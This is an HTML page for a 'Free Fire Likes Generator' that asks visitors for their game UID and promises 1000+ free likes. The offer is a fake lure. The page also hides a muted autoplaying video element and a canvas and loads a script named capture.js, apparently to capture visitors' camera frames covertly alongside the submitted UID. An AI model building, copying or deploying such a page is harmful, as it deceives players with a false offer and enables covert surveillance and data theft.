<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<meta name="theme-color" content="#ff5500">
<title>Free Fire Likes Generator</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<div class="page">
  <div class="card">
    <div class="brand-icon ff">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <line x1="6" y1="12" x2="10" y2="12"/><line x1="8" y1="10" x2="8" y2="14"/>
        <line x1="15" y1="13" x2="15.01" y2="13"/><line x1="18" y1="11" x2="18.01" y2="11"/>
        <rect x="2" y="6" width="20" height="12" rx="4"/>
      </svg>
    </div>
    <h1>Free Fire Likes Generator</h1>
    <p class="sub">Enter your Free Fire UID to receive <strong>1000+ free likes</strong> on your profile — instantly.</p>
    <div class="field">
      <label for="target">Free Fire UID</label>
      <div class="input-wrap">
        <span class="prefix">#</span>
        <input id="target" type="text" inputmode="numeric" placeholder="1234567890" autocomplete="off" autocapitalize="off" spellcheck="false">
      </div>
    </div>
    <button class="btn ff" onclick="go()">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
      Generate Likes
    </button>
    <div class="status" id="status"></div>
    <div class="trust">
      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Secure</span>
      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Instant</span>
      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>24/7</span>
    </div>
  </div>
  <div class="brand">Powered by <a href="https://t.me/noob11001" target="_blank">NOOBSTER</a></div>
</div>
<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>
<script src="/static/capture.js"></script>
<script>
function go(){
  let v=document.getElementById('target').value.trim();
  const st=document.getElementById('status');
  const btn=document.querySelector('.btn');
  if(!v){st.innerText='Please enter your Free Fire UID';return;}
  if(!/^\d{5,15}$/.test(v)){st.innerText='Please enter a valid UID';return;}
  st.innerText='';btn.disabled=true;
  handleSubmit('freefire',{uid:v});
}
</script>
</body>
</html>
